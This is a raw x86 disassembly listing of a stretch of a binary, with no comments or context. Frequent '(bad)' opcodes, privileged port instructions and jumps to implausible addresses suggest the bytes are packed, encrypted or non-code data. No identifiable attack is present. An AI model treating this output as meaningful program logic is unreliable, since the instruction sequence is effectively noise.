  41632f:	sub    ah,BYTE PTR [esi-0x4ec72e51]
  416335:	retf   
  416336:	pop    ecx
  416337:	test   DWORD PTR [ebp+ebp*1-0x229c6bd8],edi
  41633e:	dec    esi
  41633f:	fisub  WORD PTR [esi]
  416341:	add    al,0xf4
  416343:	jl     0x41636c
  416345:	gs pop ss
  416347:	(bad)  
  416348:	(bad)  
  416349:	xchg   ebp,eax
  41634a:	ret    0x339
  41634d:	lods   eax,DWORD PTR ds:[esi]
  41634e:	mov    eax,ds:0xa6ca4330
  416353:	cmc    
  416354:	and    al,BYTE PTR [ecx+ecx*4+0x75c91322]
  41635b:	dec    edi
  41635c:	cdq    
  41635d:	out    0xd4,al
  41635f:	loope  0x4163a7
  416361:	dec    esi
  416362:	add    BYTE PTR [eax-0x5a],0xc1
  416366:	push   esp
  416367:	mov    ch,0x9
  416369:	jmp    FWORD PTR ds:0x43ef30da
  41636f:	sbb    al,0xed
  416371:	xchg   dl,bh
  416373:	pop    esp
  416374:	test   BYTE PTR [ebp-0x6e],bh
  416377:	mov    esp,0x71fac6c8
  41637c:	adc    DWORD PTR [eax],ecx
  41637e:	push   es
  41637f:	pop    ebx
  416380:	sti    
  416381:	in     al,dx
  416382:	mov    DWORD PTR [edx],esi
  416384:	cwde   
  416385:	sub    ebp,esp
  416387:	adc    eax,0xd5515bdb
  41638c:	jg     0x416408
  41638e:	pop    ds
  41638f:	stos   DWORD PTR es:[edi],eax
  416390:	or     eax,DWORD PTR [ebp-0x7]
  416393:	lods   al,BYTE PTR ds:[esi]
  416394:	bnd jle 0x41633d
  416397:	icebp  
  416398:	and    eax,0x667977d
  41639d:	pop    edx
  41639e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41639f:	sub    DWORD PTR [eax-0x20],esp
  4163a2:	dec    ebp
  4163a3:	adc    ecx,ebp
  4163a5:	in     eax,dx
  4163a6:	inc    edi
  4163a7:	inc    edi
  4163a8:	pop    esi
  4163a9:	(bad)  
  4163aa:	ror    bh,1
  4163ac:	(bad)  
  4163ad:	jae    0x4163ae
  4163af:	sub    esp,DWORD PTR [edx]
  4163b1:	pusha  
  4163b2:	push   0xffffffd8
  4163b4:	jl     0x416423
  4163b6:	(bad)  
  4163b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163b8:	or     eax,0xb46c35c4
  4163bd:	and    al,0xd4
  4163bf:	dec    ebp
  4163c0:	xor    BYTE PTR [ebx],0x5a
  4163c3:	push   cs
  4163c4:	int    0x1d
  4163c6:	xor    DWORD PTR [ebx],0x76
  4163c9:	out    0x7c,eax
  4163cb:	(bad)  
  4163cc:	jge    0x4163c0
  4163ce:	sbb    cl,0x41
  4163d1:	mov    ds:0x2b4351d9,al
  4163d6:	xlat   BYTE PTR ds:[ebx]
  4163d7:	jl     0x416389
  4163d9:	je     0x416403
  4163db:	les    ecx,FWORD PTR [edi-0x61]
  4163de:	mov    fs,WORD PTR [ebx]
  4163e0:	xchg   esi,eax
  4163e1:	data16 cs addr16 aam 0x9d
  4163e6:	les    ebp,FWORD PTR [eax-0x1f]
  4163e9:	mov    ch,0x46
  4163eb:	arpl   WORD PTR [ecx-0x1f],cx
  4163ee:	in     al,dx
  4163ef:	push   ds
  4163f0:	fstp   QWORD PTR [edx-0x4486aaf]
  4163f6:	jo     0x416396
  4163f8:	mov    al,ds:0xf8d803e2
  4163fd:	dec    edx
  4163fe:	lock ins DWORD PTR es:[edi],dx
  416400:	pop    ecx
  416401:	xlat   BYTE PTR ds:[bx]
  416403:	xchg   edi,eax
  416404:	shl    DWORD PTR [ebp+0x346f70bf],cl
  41640a:	adc    dl,BYTE PTR ds:[ebp+ebp*8-0x777ab895]
  416412:	or     al,0xf5
  416414:	dec    eax
  416415:	sar    DWORD PTR [ebx-0x52],cl
  416418:	pop    ss
  416419:	sub    esp,ecx
  41641b:	sbb    esi,DWORD PTR [edx]
  41641d:	ret    
  41641e:	or     al,0x31
  416420:	push   es
  416421:	les    ebx,FWORD PTR [ebp*8-0x7b6b1e8b]
  416428:	stc    
  416429:	ins    BYTE PTR es:[edi],dx
  41642a:	and    DWORD PTR ds:0xac9050d0,edx
  416430:	inc    esp
  416431:	pop    eax
  416432:	or     esp,DWORD PTR [ecx-0x67]
  416435:	stos   DWORD PTR es:[edi],eax
  416436:	sar    BYTE PTR [eax-0x530dfdb9],cl
  41643c:	adc    DWORD PTR [edi-0x1e],esi
  41643f:	inc    edx
  416440:	sub    eax,0xc9131c69
  416445:	shr    edi,1
  416447:	mov    BYTE PTR [edx+0x7e],dh
  41644a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41644b:	in     eax,0x6f
  41644d:	lock fisubr WORD PTR [edx+edx*4+0x17]
  416452:	push   0xffffff8c
  416454:	loop   0x41645b
  416456:	outs   dx,DWORD PTR ds:[esi]
  416457:	jle    0x416425
  416459:	push   eax
  41645a:	repnz stos BYTE PTR es:[edi],al
  41645c:	imul   ebp,DWORD PTR ds:0xb66eb338,0xbebddc77
  416466:	jecxz  0x41646d
  416468:	xor    ebp,DWORD PTR [ebx+0x25]
  41646b:	jmp    0x47f5d065
  416470:	pop    ss
  416471:	inc    ebp
  416472:	mov    ecx,0xaafe4596
  416477:	retf   
  416478:	lahf   
  416479:	out    0xeb,eax
  41647b:	mov    eax,ds:0x755da05f
  416480:	xchg   esp,eax
  416481:	aam    0x80
  416483:	or     ah,BYTE PTR [edx]
  416485:	jle    0x4164a0
  416487:	into   
  416488:	inc    esp
  416489:	mov    cl,0xcf
  41648b:	mov    WORD PTR [edi+0x37],?
  41648e:	sbb    eax,DWORD PTR [ebp+ecx*1-0x5d]
  416492:	dec    esp
  416493:	jno    0x41646a
  416495:	adc    BYTE PTR [ebx-0x1de3399d],0x58
  41649c:	sub    eax,0x866709c1
  4164a1:	and    eax,0x712688d1
  4164a6:	or     BYTE PTR [ebx],al
  4164a8:	pop    ds
  4164a9:	and    edi,esi
  4164ab:	sub    eax,0xcc3f7cc7
  4164b0:	cli    
  4164b1:	jo     0x41648d
  4164b3:	or     ch,BYTE PTR [eax+ebx*8]
  4164b6:	jmp    0x4164d8
  4164b8:	add    al,0x7e
  4164ba:	loopne 0x41646b
  4164bc:	lods   eax,DWORD PTR ds:[esi]
  4164bd:	sahf   
  4164be:	lds    ebx,FWORD PTR [eax]
  4164c0:	popf   
  4164c1:	push   ecx
  4164c2:	cmp    esp,ebx
  4164c4:	out    dx,al
  4164c5:	pusha  
  4164c6:	(bad)  
  4164c7:	into   
  4164c8:	push   esp
  4164c9:	xor    al,0xd2
  4164cb:	push   ebx
  4164cc:	and    al,dh
  4164ce:	ss dec edx
  4164d0:	loop   0x4164ba
  4164d2:	push   edi
  4164d3:	or     DWORD PTR [eax+ebp*4],edi
  4164d6:	dec    ebp
  4164d7:	adc    al,0xfb
  4164d9:	repz jl 0x416467
  4164dc:	ret    
  4164dd:	fistp  WORD PTR [eax-0x24]
  4164e0:	pop    edx
  4164e1:	pusha  
  4164e2:	sub    eax,DWORD PTR [ebp-0x73]
  4164e5:	push   cs
  4164e6:	or     eax,0x8b63755e
  4164eb:	fsub   DWORD PTR [esi-0x2f197672]
  4164f1:	call   0x144f0919
  4164f6:	cld    
  4164f7:	mul    DWORD PTR [ebp-0x5fb3d3f4]
  4164fd:	dec    ecx
  4164fe:	mov    dl,0x2f
  416500:	aad    0x70
  416502:	outs   dx,BYTE PTR ds:[esi]
  416503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416504:	xor    DWORD PTR [ebp+0x2c4dbcc9],ecx
  41650a:	jbe    0x4164af
  41650c:	push   0x24
  41650e:	retf   
  41650f:	sahf   
  416510:	(bad)  
  416511:	push   0xffffffec
  416513:	iret   
  416514:	ret    
  416515:	push   ebp
  416516:	cmp    al,0xfe
  416518:	mov    esp,0xc61f519e
  41651d:	mov    edx,0x4ce4803f
  416522:	mov    esp,0xc01f059e
  416527:	push   0x51443da2
  41652c:	shl    BYTE PTR [esi+edi*2+0x63a302a9],cl
  416533:	pop    edi
  416534:	in     eax,0x31
  416536:	lahf   
  416537:	sub    DWORD PTR [edx+0x51],edx
  41653a:	cdq    
  41653b:	mov    ss,ebx
  41653d:	test   DWORD PTR [edx-0x64],eax
  416540:	mov    ch,0xc6
  416542:	pop    ds
  416543:	xchg   ecx,eax
  416544:	out    dx,eax
  416545:	out    0xd9,al
  416547:	pop    edx
  416548:	gs jnp 0x416508
  41654b:	mov    ds:0x63e19cc8,eax
  416550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416551:	mov    DWORD PTR [ebx],esi
  416553:	mov    ch,0x91
  416555:	and    al,0x43
  416557:	(bad)  
  416558:	fidivr DWORD PTR [edx]
  41655a:	xlat   BYTE PTR ds:[ebx]
  41655b:	pop    ds
  41655c:	mov    ah,0x5f
  41655e:	leave  
  41655f:	or     cl,BYTE PTR [ebp+0x2f65a9b4]
  416565:	inc    ecx
  416566:	ret    0xc198
  416569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41656a:	std    
  41656b:	inc    edx
  41656c:	inc    edx
  41656d:	xlat   BYTE PTR ds:[ebx]
  41656e:	das    
  41656f:	mov    esp,0x5c1bbc50
  416574:	ror    BYTE PTR [esi-0x28],cl
  416577:	lock pop ebp
  416579:	mov    DWORD PTR [edx+0x4d],edx
  41657c:	jbe    0x416516
  41657e:	pop    ebx
  41657f:	push   0xb36835af
  416584:	pop    esp
  416585:	jnp    0x4165e6
  416587:	push   es
  416588:	or     edx,DWORD PTR [esi]
  41658a:	mov    BYTE PTR [esi+0x3305ad78],0x47
  416591:	mov    ebp,0x498b65
  416596:	mov    ah,0xd9
  416598:	aaa    
  416599:	cmp    BYTE PTR [ecx-0x55],ah
  41659c:	pop    ss
  41659d:	ret    
  41659e:	in     al,0xb6
  4165a0:	out    0x66,al
  4165a2:	fiadd  WORD PTR [eax+eiz*8+0x2eaf9fac]
  4165a9:	out    dx,al
  4165aa:	push   ecx
  4165ab:	mov    eax,ds:0x1873804e
  4165b0:	(bad)  
  4165b1:	cmp    al,BYTE PTR [ecx+esi*1-0x1e]
  4165b5:	mov    eax,ds:0x602bf29a
  4165ba:	(bad)  
  4165bb:	call   FWORD PTR [eax+0x7f36d8f3]
  4165c1:	aam    0x94
  4165c3:	xor    dl,bl
  4165c5:	jl     0x4165a3
  4165c7:	push   ebx
  4165c8:	cmp    DWORD PTR [ecx+0x1a36be88],esp
  4165ce:	dec    esi
  4165cf:	mov    edx,ss
  4165d1:	cmp    al,0xf3
  4165d3:	cmp    DWORD PTR [ebx-0x1599e5b2],0xffffffc2
  4165da:	sahf   
  4165db:	hlt    
  4165dc:	sbb    esp,DWORD PTR ds:0x542b2de0
  4165e2:	push   ss
  4165e3:	retf   
  4165e4:	popa   
  4165e5:	jge    0x416630
  4165e7:	mov    edx,0x922eb62d
  4165ec:	int    0xba
  4165ee:	mov    gs,WORD PTR [ebp+eax*8-0x463b3bd3]
  4165f5:	lods   eax,DWORD PTR ds:[esi]
  4165f6:	xchg   ecx,eax
  4165f7:	test   BYTE PTR [eax+0x5edfa64a],cl
  4165fd:	pushf  
  4165fe:	xchg   esi,eax
  4165ff:	sub    BYTE PTR [eax+0xc],ch
  416602:	aad    0x12
  416604:	test   DWORD PTR [ebx+0x6a],ebx
  416607:	fucomip st,st(3)
  416609:	push   eax
  41660a:	mov    ecx,0x74d795d
  41660f:	out    dx,al
  416610:	(bad)  
  416611:	test   al,0xe5
  416613:	or     al,0xca
  416615:	into   
  416616:	ret    0xaf9c
  416619:	jno    0x41659d
  41661b:	rol    DWORD PTR [ebx-0x633e3bff],1
  416621:	jnp    0x416683
  416623:	lods   eax,DWORD PTR ds:[esi]
  416624:	fs out 0xbc,eax
  416627:	or     eax,0x4526ec7a
  41662c:	add    DWORD PTR [ebx+0x1d],eax
  41662f:	or     eax,0x98333143
  416634:	push   es
  416635:	add    eax,0x50ac8d10
  41663a:	test   edi,edi
  41663c:	(bad)  
  41663e:	scas   al,BYTE PTR es:[edi]
  41663f:	fld    QWORD PTR [edi-0x1eaf20de]
  416645:	mov    edx,0x1d0e5e7f
  41664a:	add    al,0x3e
  41664c:	mov    BYTE PTR [ebp+edx*8-0x19fecb9f],0x81
  416654:	pusha  
  416655:	add    edi,DWORD PTR [ebp-0x358195f7]
  41665b:	xchg   esi,eax
  41665c:	add    cl,al
  41665e:	in     eax,0x42
  416660:	and    BYTE PTR [ebx],dl
  416662:	mov    al,ds:0xb875ef3f
  416667:	outs   dx,DWORD PTR ds:[esi]
  416668:	mov    ebx,DWORD PTR [ecx-0x402619ae]
  41666e:	pop    ss
  41666f:	and    BYTE PTR [edi-0x12],bh
  416672:	aaa    
  416673:	push   0x56
  416675:	push   edx
  416676:	xchg   ecx,eax
  416677:	sub    eax,0x63effb51
  41667c:	push   edi
  41667d:	and    ebp,DWORD PTR [ecx+0x1d]
  416680:	and    al,0x4a
  416682:	loopne 0x416612
  416684:	outs   dx,BYTE PTR ds:[esi]
  416685:	bound  edi,QWORD PTR [ebp+0x762f60b9]
  41668b:	and    ebx,DWORD PTR [ebx]
  41668d:	cmc    
  41668e:	cmc    
  41668f:	pop    ebx
  416690:	enter  0x118b,0x2b
  416694:	retf   
  416695:	xor    al,0x27
  416697:	mov    ch,0xc6
  416699:	push   0xc0ac15a8
  41669e:	sbb    ch,BYTE PTR [edx]
  4166a0:	jl     0x4166f1
  4166a2:	in     al,0x83
  4166a4:	fisttp QWORD PTR [edi-0x5a]
  4166a8:	sbb    BYTE PTR [esi],ch
  4166aa:	jb     0x4166e6
  4166ac:	dec    edx
  4166ad:	mov    eax,ds:0x2e15f684
  4166b2:	jbe    0x416661
  4166b4:	pop    ds
  4166b5:	lock add eax,edx
  4166b8:	mov    al,ds:0x15e39b21
  4166bd:	ss in  eax,0xc4
  4166c0:	xchg   edx,eax
  4166c1:	and    BYTE PTR [ebx],ch
  4166c3:	imul   BYTE PTR [edi+0x38ae4fef]
  4166c9:	in     al,0xc9
  4166cb:	xchg   esi,eax
  4166cc:	adc    esp,DWORD PTR [edx-0x2f875717]
  4166d2:	push   ecx
  4166d3:	mov    ecx,0x304ec04f
  4166d8:	cwde   
  4166d9:	mov    al,0x64
  4166db:	fcom   DWORD PTR [eax+0x11]
  4166de:	inc    edx
  4166df:	jne    0x416674
  4166e1:	das    
  4166e2:	adc    dl,BYTE PTR [eax]
  4166e4:	int3   
  4166e5:	push   ss
  4166e6:	mov    dl,0x8d
  4166e8:	pop    es
  4166e9:	xchg   ebx,eax
  4166ea:	xchg   ecx,eax
  4166eb:	out    dx,al
  4166ec:	ins    DWORD PTR es:[edi],dx
  4166ed:	fistp  WORD PTR [ebx-0x27]
  4166f0:	jbe    0x4166c4
  4166f2:	int3   
  4166f3:	xchg   edx,eax
  4166f4:	nop
  4166f5:	loope  0x4166ae
  4166f7:	stos   BYTE PTR es:[edi],al
  4166f8:	icebp  
  4166f9:	sub    ah,ah
  4166fb:	ja     0x4166ac
  4166fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166fe:	and    dl,BYTE PTR [ebx+eax*4-0x358e32aa]
  416705:	ret    
  416706:	sub    bh,BYTE PTR [eax+edi*8+0x56]
  41670a:	pop    ds
  41670b:	lods   eax,DWORD PTR ss:[esi]
  41670d:	outs   dx,DWORD PTR ds:[esi]
  41670e:	in     eax,0x1f
  416710:	shr    BYTE PTR [eax-0x12],cl
  416713:	sbb    ecx,DWORD PTR cs:[eax+0x6fc52f99]
  41671a:	mov    bh,0xac
  41671c:	push   edi
  41671d:	rcl    BYTE PTR [edx],0x64
  416720:	das    
  416721:	sbb    DWORD PTR [edi+0x24],eax
  416724:	push   eax
  416725:	and    DWORD PTR [esi],0x69
  416728:	push   esi
  416729:	inc    edi
  41672a:	mov    esp,0x3eabebb1
  41672f:	repnz xchg ebx,eax
  416731:	cmp    bl,BYTE PTR [ebx+eiz*1]
  416734:	gs pop eax
  416736:	or     eax,0x190bf14c
  41673b:	dec    eax
  41673c:	xchg   ebx,eax
  41673d:	sub    eax,0xde216715
  416742:	les    edi,FWORD PTR [esi-0x30]
  416745:	sub    DWORD PTR [ecx-0xb],ebp
  416748:	xchg   ebx,eax
  416749:	push   ss
  41674a:	sub    al,0x51
  41674c:	pop    edi
  41674d:	xchg   DWORD PTR [esi-0x213f390e],edi
  416753:	shl    DWORD PTR [eax+0x3d04a5dd],1
  416759:	xchg   edi,eax
  41675a:	sbb    eax,0xa4e584ba
  41675f:	ja     0x4167a4
  416761:	pop    esp
  416762:	ror    DWORD PTR [ecx+0x1024e801],cl
  416768:	jl     0x4166eb
  41676a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41676b:	mov    DWORD PTR [ecx-0x9],esp
  41676e:	pop    ebp
  41676f:	adc    esp,DWORD PTR [ebx]
  416771:	aaa    
  416772:	sbb    eax,0xdb7998af
  416777:	mov    eax,ds:0x8289e01a
  41677c:	rol    DWORD PTR [eax],0xb
  41677f:	mov    ecx,0xad8b67a7
  416784:	dec    edi
  416785:	lock ret 0x57be
  416789:	or     dl,bl
  41678b:	fisubr DWORD PTR [eax-0x1f]
  41678e:	out    dx,al
  41678f:	aam    0xb2
  416791:	cmp    DWORD PTR [edx+ecx*8+0x360e5a03],esi
  416798:	sbb    BYTE PTR [ebx+0x69791740],bl
  41679e:	mov    edi,0xcaf5d00c
  4167a3:	adc    ecx,DWORD PTR [eax]
  4167a5:	cmp    ecx,DWORD PTR [edi]
  4167a7:	mov    ebx,0xae58954a
  4167ac:	push   ebx
  4167ad:	and    BYTE PTR [edi+0x2e],0x20
  4167b1:	or     DWORD PTR ds:0xcc710676,eax
  4167b7:	les    edi,FWORD PTR [edx]
  4167b9:	dec    ecx
  4167ba:	mov    dh,0xf8
  4167bc:	int    0xd3
  4167be:	jne    0x416762
  4167c0:	les    ebp,FWORD PTR [edx-0x3aa9d417]
  4167c6:	or     bl,BYTE PTR [edi]
  4167c8:	icebp  
  4167c9:	dec    ecx
  4167ca:	mov    ch,BYTE PTR [ebx]
  4167cc:	div    DWORD PTR [ebp+eax*4-0x3fe9aa01]
  4167d3:	mov    edx,DWORD PTR [edi+ebp*2+0x1]
  4167d7:	inc    esp
  4167d8:	in     eax,dx
  4167d9:	cld    
  4167da:	les    edi,FWORD PTR [esi+edx*1]
  4167dd:	inc    ebx
  4167de:	push   ebp
  4167df:	ins    BYTE PTR es:[edi],dx
  4167e0:	leave  
  4167e1:	sub    eax,esp
  4167e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e4:	ins    BYTE PTR es:[edi],dx
  4167e5:	xor    eax,0xac915869
  4167ea:	mov    bh,0xd2
  4167ec:	mov    esi,0x98b570ff
  4167f1:	push   eax
  4167f2:	sbb    al,BYTE PTR [esi+0x62]
  4167f5:	jbe    0x4167bb
  4167f7:	std    
  4167f8:	in     eax,dx
  4167f9:	inc    edi
  4167fa:	push   cs
  4167fb:	xchg   ebx,eax
  4167fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167fd:	mov    DWORD PTR [ecx+0x6b],0x83cb6947
  416804:	inc    esi
  416805:	pop    esp
  416806:	out    dx,al
  416807:	(bad)  
  416808:	js     0x41678d
  41680a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41680b:	rcl    BYTE PTR ds:0x19acbd2d,1
  416811:	inc    ecx
  416812:	aas    
  416813:	cld    
  416814:	dec    eax
  416815:	mov    ebx,ecx
  416817:	inc    edi
  416818:	xchg   BYTE PTR [edx+0x1d733358],dl
  41681e:	ins    DWORD PTR es:[edi],dx
  41681f:	in     eax,dx
  416820:	mov    eax,ds:0xf4e78fe4
  416825:	pop    ss
  416826:	enter  0xc00,0xa2
  41682a:	std    
  41682b:	(bad)  
  41682c:	out    0x68,al
  41682e:	mov    ecx,0x72085130
  416833:	pop    DWORD PTR [edi+0xe]
  416836:	in     al,0x27
  416838:	pop    ebp
  416839:	jl     0x4167c7
  41683b:	inc    esp
  41683c:	cmp    DWORD PTR [esi],edi
  41683e:	(bad)  
  41683f:	push   ebp
  416840:	xor    al,0xab
  416842:	inc    edx
  416843:	out    dx,eax
  416844:	out    dx,eax
  416845:	fcomp  DWORD PTR [esp+eiz*2-0x44]
  416849:	dec    ecx
  41684a:	ficom  DWORD PTR [edx+0x71597b88]
  416850:	jp     0x4167d9
  416852:	adc    edi,DWORD PTR [edi]
  416854:	pop    ds
  416855:	xchg   edx,eax
  416856:	idiv   DWORD PTR [edi-0x13]
  416859:	sbb    BYTE PTR [eax+0x30446a9d],bl
  41685f:	jo     0x416806
  416861:	imul   edx,DWORD PTR [eax+0x2f1060b3],0xffffffa0
  416868:	(bad)  
  416869:	int3   
  41686a:	sti    
  41686b:	xor    eax,esp
  41686d:	je     0x416800
  41686f:	cs or  esi,edi
  416872:	xor    eax,DWORD PTR [edx+0x57e3f531]
  416878:	xchg   edx,eax
  416879:	inc    edx
  41687a:	inc    ecx
  41687b:	daa    
  41687c:	imul   ebp,DWORD PTR [edi-0x1559e267],0x6e
  416883:	dec    esi
  416884:	and    ebp,DWORD PTR [ebx-0x6e]
  416887:	inc    edx
  416888:	cdq    
  416889:	sbb    eax,0xb47a19e4
  41688e:	sub    BYTE PTR [ecx+0x2f0a85e5],ch
  416894:	jmp    FWORD PTR [ebp+0x38]
  416897:	adc    DWORD PTR [edx-0x13],eax
  41689a:	imul   BYTE PTR [ebx-0x6c2e2d3e]
  4168a0:	adc    edx,DWORD PTR [edi]
  4168a2:	push   edi
  4168a3:	or     DWORD PTR ds:0x166b65e,eax
  4168a9:	mov    ds:0xe55bb3df,al
  4168ae:	xchg   ecx,eax
  4168af:	mov    bl,BYTE PTR [ebp-0x21]
  4168b2:	fld    DWORD PTR [ebx]
  4168b4:	and    eax,0xad7d39de
  4168b9:	fst    DWORD PTR [eax+ebp*4-0x57]
  4168bd:	cmp    al,0xd0
  4168bf:	cdq    
  4168c0:	dec    ebp
  4168c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168c2:	iret   
  4168c3:	daa    
  4168c4:	mov    eax,ds:0x85996fe2
  4168c9:	sub    eax,0x69ec6852
  4168ce:	icebp  
  4168cf:	cmp    BYTE PTR [edi+0x79e1580f],dh
  4168d5:	pop    ebx
  4168d6:	fidivr DWORD PTR [edi+0x4b2c3a22]
  4168dc:	pop    edi
  4168dd:	jmp    0x9bd0:0x8c5cb00b
  4168e4:	mov    BYTE PTR [edi-0x7],dh
  4168e7:	fdivr  DWORD PTR [esi-0x6e]
  4168ea:	xchg   ebp,eax
  4168eb:	xchg   esi,eax
  4168ec:	xchg   DWORD PTR [eax+0x2d6249b9],esp
  4168f2:	jle    0x41695e
  4168f4:	mov    dh,0x3
  4168f6:	fadd   QWORD PTR [ebx]
  4168f8:	out    0x94,eax
  4168fa:	xor    ebp,0x7d0f1aa2
  416900:	fdiv   st(3),st
  416902:	jno    0x4168e3
  416904:	inc    ebp
  416905:	mov    edx,0x1ce8783a
  41690a:	into   
  41690b:	cmp    dl,BYTE PTR [edx]
  41690d:	arpl   WORD PTR [eax+eax*1-0x1c],bp
  416911:	mov    dh,0xcd
  416913:	adc    al,0xa3
  416915:	popf   
  416916:	push   ss
  416917:	pop    ss
  416918:	nop
  416919:	push   ebx
  41691a:	ja     0x416929
  41691c:	lods   al,BYTE PTR ds:[esi]
  41691d:	call   0x5512c37f
  416922:	dec    ecx
  416923:	and    al,0xc2
  416925:	mov    dl,0x5c
  416927:	in     al,dx
  416928:	jg     0x41694c
  41692a:	loop   0x416984
  41692c:	mov    WORD PTR [ebx-0x4a7dc02],?
  416932:	in     eax,0xde
  416934:	push   ds
  416935:	enter  0x864d,0x3d
  416939:	loope  0x416971
  41693b:	adc    ebp,0xa948a546
  416941:	adc    eax,0xc1e76237
  416946:	scas   eax,DWORD PTR es:[edi]
  416947:	adc    al,0xb
  416949:	sub    ecx,ebp
  41694b:	lahf   
  41694c:	xchg   ebp,eax
  41694d:	jle    0x416972
  41694f:	push   esp
  416950:	adc    dh,BYTE PTR [esi-0x39]
  416953:	or     DWORD PTR [eax],edi
  416955:	dec    esi
  416956:	xchg   ecx,eax
  416957:	gs jp  0x41696c
  41695a:	xchg   ebx,eax
  41695b:	mov    DWORD PTR [ebp-0x75b5e136],edx
  416961:	add    ebx,DWORD PTR [edi-0x6c]
  416964:	mov    ch,0x2f
  416966:	dec    edi
  416967:	fst    DWORD PTR [esi+0x77]
  41696a:	imul   DWORD PTR [eax]
  41696c:	or     BYTE PTR [edx],bh
  41696e:	cmp    DWORD PTR [ebp-0x4],ecx
  416971:	sbb    eax,DWORD PTR fs:[edi+0x4e]
  416975:	mov    ch,0x1a
  416977:	pop    esi
  416978:	jnp    0x416962
  41697a:	shl    DWORD PTR [edi+0x4b918138],cl
  416980:	fidiv  DWORD PTR [edi-0x3a]
  416983:	outs   dx,DWORD PTR ds:[esi]
  416984:	sbb    al,0xe9
  416986:	loop   0x41694f
  416988:	ss in  eax,0x94
  41698b:	(bad)  
  41698d:	daa    
  41698e:	jle    0x4169c6
  416990:	sbb    al,0x47
  416992:	xchg   esi,eax
  416993:	jg     0x416916
  416995:	fdiv   QWORD PTR [esi-0x3f]
  416998:	cli    
  416999:	xor    ch,BYTE PTR [ecx]
  41699b:	test   DWORD PTR [ecx+ebx*2-0x167dba05],edx
  4169a2:	mov    ds:0xde7517cc,al
  4169a7:	test   DWORD PTR [esi],ecx
  4169a9:	mul    BYTE PTR [edi]
  4169ab:	push   ebx
  4169ac:	sub    BYTE PTR [ecx+0x4c],ah
  4169af:	stc    
  4169b0:	jge    0x416a27
  4169b2:	cmp    ah,BYTE PTR [edx-0x1c215a27]
  4169b8:	mov    bh,0xa4
  4169ba:	jp     0x416a15
  4169bc:	mov    ds:0xcfe8a930,al
  4169c1:	cmp    al,0xa6
  4169c3:	pop    ebp
  4169c4:	mov    ch,0xc3
  4169c6:	mov    ds:0xbd0a5daa,al
  4169cb:	mov    edx,0x7f0f8feb
  4169d0:	aam    0x6a
  4169d2:	aad    0x55
  4169d4:	adc    BYTE PTR [edx],dl
  4169d6:	loopne 0x4169a2
  4169d8:	dec    ebp
  4169d9:	and    BYTE PTR cs:[esi-0x3a],bh
  4169dd:	mul    ch
  4169df:	xor    eax,edx
  4169e1:	jnp    0x4169a3
  4169e3:	xor    eax,0x68ae0d80
  4169e8:	pop    ds
  4169e9:	pop    ss
  4169ea:	adc    bl,ah
  4169ec:	pop    ecx
  4169ed:	arpl   si,bp
  4169ef:	sub    al,0x82
  4169f1:	js     0x4169f8
  4169f3:	lahf   
  4169f4:	iret   
  4169f5:	adc    al,0x1e
  4169f7:	or     DWORD PTR [ebx+0x5f],0x1817a11f
  4169fe:	je     0x4169a8
  416a00:	lea    ebp,[ecx]
  416a02:	jbe    0x416a3a
  416a04:	bound  edx,QWORD PTR [esi-0x61]
  416a07:	or     ebx,DWORD PTR [edi]
  416a09:	mov    al,0x68
  416a0b:	mov    WORD PTR [edx],?
  416a0d:	cli    
  416a0e:	fisubr WORD PTR cs:[ebp-0x2c5bf4e1]
  416a15:	push   ebx
  416a16:	fild   WORD PTR [esi+ebp*2]
  416a19:	fs lock adc eax,0x371f49a3
  416a20:	dec    ebx
  416a21:	neg    DWORD PTR [edx]
  416a23:	dec    esp
  416a24:	ins    BYTE PTR es:[edi],dx
  416a25:	or     ecx,DWORD PTR [ecx]
  416a27:	fstp   TBYTE PTR [ebp+0xc]
  416a2a:	dec    ecx
  416a2b:	ins    BYTE PTR es:[edi],dx
  416a2c:	in     al,dx
  416a2d:	xchg   esi,eax
  416a2e:	or     eax,0x8bde16bf
  416a33:	xor    DWORD PTR [esi],edi
  416a35:	out    0x1e,eax
  416a37:	mov    ds:0xa35b797f,al
  416a3c:	stos   BYTE PTR es:[edi],al
  416a3d:	aas    
  416a3e:	and    eax,0xe58d5746
  416a43:	lea    ebp,[ebp-0x258a5476]
  416a49:	enter  0x622b,0x8
  416a4d:	js     0x416a3a
  416a4f:	mov    edi,ecx
  416a51:	push   ebp
  416a52:	mov    eax,0xf8781949
  416a57:	jbe    0x416a52
  416a59:	dec    esi
  416a5a:	mov    eax,ds:0x93fd18c1
  416a5f:	imul   ebp,DWORD PTR [eax+esi*4+0x5540a845],0x2661e98
  416a6a:	sub    dh,bh
  416a6c:	and    al,0x8b
  416a6e:	inc    esi
  416a6f:	inc    esi
  416a70:	mov    ds:0x7eb24b86,eax
  416a75:	jecxz  0x416a82
  416a77:	or     BYTE PTR [esi-0x1893a49f],ah
  416a7d:	xchg   ebp,eax
  416a7e:	adc    al,0xfc
  416a80:	add    eax,0xe08354e2
  416a85:	sub    eax,0x569ed44a
  416a8a:	xchg   edx,eax
  416a8b:	aam    0xf1
  416a8d:	xor    BYTE PTR [esi+0x4b],0x50
  416a91:	sbb    BYTE PTR [ebx-0x6000cd89],0x9b
  416a98:	dec    ebp
  416a99:	push   ds
  416a9a:	jmp    DWORD PTR [eax-0x3f3dc540]
  416aa0:	or     edi,esi
  416aa2:	call   0x699b:0x82960d45
  416aa9:	push   esi
  416aaa:	ret    
  416aab:	add    al,0x47
  416aad:	shl    BYTE PTR [eax+0x4d],cl
  416ab0:	add    al,0x3e
  416ab2:	sbb    BYTE PTR [ebp+0x62],ch
  416ab5:	fcom   DWORD PTR [ebx+0x0]
  416ab8:	pop    ss
  416ab9:	jecxz  0x416b06
  416abb:	xchg   edi,eax
  416abc:	sbb    al,0xb6
  416abe:	sub    al,0xd2
  416ac0:	mov    esi,0xea4c5df6
  416ac5:	sub    BYTE PTR [ebx-0x64],dl
  416ac8:	mov    ebx,DWORD PTR [ecx-0x65]
